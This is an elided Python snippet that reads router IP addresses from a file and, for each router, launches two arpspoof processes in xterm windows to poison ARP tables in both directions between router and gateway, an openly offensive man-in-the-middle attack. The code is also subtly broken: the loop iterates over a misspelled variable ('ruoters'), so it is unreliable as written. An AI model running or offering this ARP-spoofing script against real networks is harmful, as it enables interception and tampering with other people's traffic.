...
# get routers_ip
routers = [line.rstrip('\n') for line in open("routersip.txt")]
print("routers:")
print(routers)
...
for router in ruoters:
    os.system("xterm -e arpspoof -i eth0 -t " + router + " " + gateway + " &")
    os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + router + " &")
